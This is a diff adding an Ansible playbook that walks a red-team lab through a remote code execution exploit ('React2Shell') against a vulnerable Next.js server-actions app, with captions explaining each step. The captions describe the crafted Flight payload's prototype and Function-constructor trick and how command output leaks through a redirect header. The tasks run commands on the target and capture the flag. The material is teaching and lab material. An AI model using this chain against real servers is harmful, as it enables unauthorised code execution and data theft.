@@ -1,0 +1,228 @@
+---
+- name: Red Team | Build the React2Shell exploit step by step
+  hosts: red_team
+  gather_facts: false
+  vars:
+    react2shell_command: >-
+      cat /opt/react2shell-lab/capture/flag.txt && /opt/react2shell-lab/capture/show_message.sh
+  tasks:
+    - name: Install curl
+      become: true
+      vars:
+        walkthrough_caption: >-
+          curl is the command-line web client that every later step uses to talk to the Blue
+          server. This step only makes sure it is present on the Red VM. Ansible is idempotent:
+          if curl is already installed the step reports "Nothing to do" and changes nothing, so
+          the same playbook is safe to run again and again.
+      ansible.builtin.package:
+        name: curl
+        state: present
+
+    - name: Fetch the challenge page
+      vars:
+        walkthrough_caption: >-
+          The first test asks Blue for its page. Reading the curl flags one by one:
+          --noproxy '*' tells curl to ignore any system proxy and connect straight to the target;
+          -s keeps the progress meter quiet; -S still prints real errors if they happen; -f makes
+          curl fail on HTTP error codes instead of saving their pages; -o /dev/null throws the
+          page body away because we only care about the status; -w writes a summary where
+          %{http_code} is a placeholder curl replaces with the real status number. The output
+          HTTP 200 is web shorthand for "OK, here is the page", and the EXIT 0 badge is the
+          command's exit code, where zero means success.
+      ansible.builtin.shell:
+        cmd: >-
+          curl --noproxy '*' -o /dev/null -fsS -w 'HTTP %{http_code}\n'
+          {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }}
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Read the page heading
+      vars:
+        walkthrough_caption: >-
+          The same request, but this time the page body is piped (the | symbol) into grep, and
+          grep -o prints only the matching piece of text instead of whole lines. The match is the
+          title tag of the Blue challenge page. This proves we are talking to the lab app and not
+          some other server, and it is the before picture we can compare against later.
+      ansible.builtin.shell:
+        cmd: >-
+          curl --noproxy '*' -fsS {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }}
+          | grep -o '<title>[^<]*</title>'
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Find the server action ID
+      vars:
+        walkthrough_caption: >-
+          Next.js server actions let a button on a page call a function that runs on the server.
+          The page hides a form field named $ACTION_ID_ followed by a long hex string (your exact
+          string will differ from other builds). Pressing the button makes the browser POST to the
+          same URL with a Next-Action header naming that ID, and Next runs the matching function
+          server-side. That POST route is the doorway the exploit walks through, so this step
+          confirms the door exists before we touch anything.
+      ansible.builtin.shell:
+        cmd: >-
+          curl --noproxy '*' -fsS {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }}
+          | grep -o 'name="\$ACTION_ID_[0-9a-f]*"'
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Probe the Flight decoder
+      vars:
+        walkthrough_caption: >-
+          React moves data between the browser and the server in a text format called Flight,
+          where $1 means "chunk number 1" and colons walk properties inside it. The helper script
+          is piped into bash over the SSH connection (bash -s reads the script from standard
+          input, and -- passes the following words as arguments), so each mode is one line. The
+          probe mode sends two small multipart form fields: field 1 is an empty object, field 0 is
+          ["$1:a:a"], meaning chunk 1, property a, then property a again. The decoder follows that
+          reference, finds nothing there, and crashes. The verdict explains itself: HTTP 500 is a
+          server-side crash, and the E{"digest"...} text is how React reports an error upstream
+          without leaking details. Crucially no code has run yet - the probe only asked the
+          decoder to look up an empty property, which is why this is the safe proof.
+      ansible.builtin.shell:
+        cmd: >-
+          bash -s -- probe
+          {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }}
+        stdin: "{{ lookup('ansible.builtin.file', playbook_dir ~ '/../scripts/react2shell.sh') }}"
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Assemble the crafted chunk
+      vars:
+        walkthrough_caption: >-
+          This step prints the exact data the attack sends, without sending anything. Chunk 0 is
+          one JSON line: "then": "$1:__proto__:then" tells the decoder our fake chunk behaves like
+          a JavaScript promise; "status": "resolved_model" and "reason": -1 are internal
+          bookkeeping values that trick the decoder into believing the chunk already holds decoded
+          data; "value" holds escaped nested JSON containing "$B0", meaning "look up entry 0 in
+          the request's form data"; and "_response" replaces internal objects, most importantly
+          "_formData": {"get": "$1:constructor:constructor"} which swaps a lookup function for the
+          standard Function constructor - the JavaScript built-in that compiles a text string into
+          executable code. Chunk 1 is "$@0", meaning "the promise of chunk 0", the final link that
+          starts the chain.
+      ansible.builtin.shell:
+        cmd: >-
+          bash -s -- payload
+          {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }}
+        stdin: "{{ lookup('ansible.builtin.file', playbook_dir ~ '/../scripts/react2shell.sh') }}"
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Show the JavaScript payload
+      vars:
+        walkthrough_caption: >-
+          The confused lookup ends up calling Function(prefix + "0"), so the prefix text becomes
+          running code inside the Node server. The code mode prints that prefix for the id
+          command: execSync('id') runs the shell command and captures its output; Buffer.from(
+          ...).toString('base64') encodes the output as base64 so it can travel safely inside a
+          header; and the fake error with digest='NEXT_REDIRECT;...' borrows Next's own redirect
+          mechanism, which copies that base64 into a response header. Nothing is sent in this
+          step - it is the same printout style as the previous one.
+      ansible.builtin.shell:
+        cmd: >-
+          bash -s -- code
+          {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }}
+        stdin: "{{ lookup('ansible.builtin.file', playbook_dir ~ '/../scripts/react2shell.sh') }}"
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Fire the payload and read the raw response
+      vars:
+        walkthrough_caption: >-
+          First contact. The raw mode sends the real payload and prints the server's answer
+          completely unparsed, headers first. HTTP/1.1 303 See Other is a redirect - the fake
+          NEXT_REDIRECT error from the payload did that on purpose. The interesting line is
+          x-action-redirect: it starts with http://x/, continues with a long base64 string, and
+          ends with ;push. That base64 is the output of the id command, encoded so it can travel
+          inside a header. This is exactly what the previous step predicted, now observed live.
+      ansible.builtin.shell:
+        cmd: >-
+          bash -s -- raw
+          {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }} id
+        stdin: "{{ lookup('ansible.builtin.file', playbook_dir ~ '/../scripts/react2shell.sh') }}"
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Read the decoded output
+      vars:
+        walkthrough_caption: >-
+          The exploit mode is the same request, but the script now strips the header prefix and
+          base64-decodes the payload for us. The output reads uid=63740(react2shell-lab) - note
+          what it is not: it is not root. Blue's systemd unit runs the challenge with
+          DynamicUser=yes, which gives the service a throwaway account created just for it, plus
+          read-only filesystem mounts and no capabilities. The exploit works, yet lands in one of
+          the most restricted seats on the machine - a real lesson in defense in depth.
+      ansible.builtin.shell:
+        cmd: >-
+          bash -s -- exploit
+          {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }} id
+        stdin: "{{ lookup('ansible.builtin.file', playbook_dir ~ '/../scripts/react2shell.sh') }}"
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Prove where the code runs
+      vars:
+        walkthrough_caption: >-
+          A quick check that commands really execute on the Blue VM and not somewhere else:
+          hostname prints the challenge host's name and uname -sr prints its kernel name and
+          version. If these names match the Blue droplet, the shell we borrowed is on the target
+          machine. Each run is one fresh request - nothing about the command persists.
+      ansible.builtin.shell:
+        cmd: >-
+          bash -s -- exploit
+          {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }}
+          'hostname && uname -sr'
+        stdin: "{{ lookup('ansible.builtin.file', playbook_dir ~ '/../scripts/react2shell.sh') }}"
+        executable: /bin/bash
+      changed_when: false
+
+    - name: List the capture files
+      vars:
+        walkthrough_caption: >-
+          The challenge installer created a capture directory with three files, and ls -la shows
+          them with full details. The first column is the file type (a dash means regular file)
+          followed by the permission string: r for read, w for write, x for execute, written in
+          three groups of three for owner, group, and everyone else. These files are root-owned
+          but world-readable, which is exactly why the sandboxed dynamic user can read them.
+          flag.txt holds the prize, message.txt is flavor text, and show_message.sh is a tiny
+          script that prints message.txt. Reading them is the goal of the challenge.
+      ansible.builtin.shell:
+        cmd: >-
+          bash -s -- exploit
+          {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }}
+          'ls -la /opt/react2shell-lab/capture/'
+        stdin: "{{ lookup('ansible.builtin.file', playbook_dir ~ '/../scripts/react2shell.sh') }}"
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Capture the flag
+      vars:
+        walkthrough_caption: >-
+          The finale reads flag.txt and then runs show_message.sh. The CTF{react2shell_...}
+          string is the challenge's proof-of-exploitation token: a random value generated when
+          Blue was installed, knowable only by reading that file on the server. Possessing it
+          demonstrates the exploit chain end to end, which is the same role flags play in any
+          capture-the-flag event. The second line of output is the message script doing its job.
+      ansible.builtin.shell:
+        cmd: >-
+          bash -s -- exploit
+          {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }}
+          {{ react2shell_command | quote }}
+        stdin: "{{ lookup('ansible.builtin.file', playbook_dir ~ '/../scripts/react2shell.sh') }}"
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Confirm the challenge survived
+      vars:
+        walkthrough_caption: >-
+          Closing test, identical to the opening one. HTTP 200 again means the app is still
+          serving its page normally: the exploit borrowed the process for single requests and
+          left nothing behind. Compare that with the deface playbook, which deliberately installs
+          a memory hook that changes every page until the revert playbook or a service restart
+          removes it.
+      ansible.builtin.shell:
+        cmd: >-
+          curl --noproxy '*' -o /dev/null -fsS -w 'HTTP %{http_code}\n'
+          {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }}
+        executable: /bin/bash
+      changed_when: false
